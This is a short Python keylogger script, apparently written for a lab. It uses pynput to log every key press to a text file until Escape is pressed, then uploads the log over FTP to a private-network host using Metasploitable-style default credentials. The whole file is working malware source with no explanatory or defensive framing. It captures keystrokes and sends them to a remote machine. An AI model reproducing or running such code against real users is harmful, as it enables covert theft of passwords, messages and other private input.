from pynput.keyboard import Key, Listener
import ftplib
import logging

logdir = ""

logging.basicConfig(filename=(logdir +"klog-res.txt"),level=logging.DEBUG, format='%(asctime)s: %(message)s')

def pressing_key(key):
    try:
        logging.info(str(key))
    except AttributeError:
        print("A special key {0} pressed".format(key))


def release_key(key):
    if key == Key.esc:
        return False

print("\nStarted Listening...\n")

with Listener(on_press=pressing_key, on_release=release_key) as listener:
    listener.join()

print("\nConnecting to the FTP and sending the data...\n")

sess = ftplib.FTP("10.0.2.15", "msfadmin", "msfadmin")
file = open("klog-res.txt", "rb")
sess.storbinary("STOR klog-res.txt", file)
file.close()
sess.quit()